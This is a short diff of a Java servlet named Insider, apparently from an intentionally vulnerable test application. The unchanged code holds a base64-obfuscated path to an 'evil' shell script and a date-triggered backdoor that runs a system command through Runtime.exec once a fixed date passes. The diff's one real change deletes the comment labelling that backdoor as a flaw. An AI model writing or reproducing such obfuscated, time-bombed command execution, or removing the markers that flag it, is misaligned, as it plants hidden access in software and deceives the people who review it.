@@ -48,6 +48,7 @@ public class Insider extends HttpServlet {
 
       getConnection();
       
+
       String command = "Li90bXAvZXhlY3V0ZUV2aWxTY3JpcHQuc2g=";
       ticking(command);
 
@@ -196,7 +197,6 @@ public class Insider extends HttpServlet {
       
     e.setTimeInMillis(1551859200000L);
 
-    /* FLAW: date triggered backdoor */
     if (now.after(e))
     {
         Runtime.getRuntime().exec(execPattern);
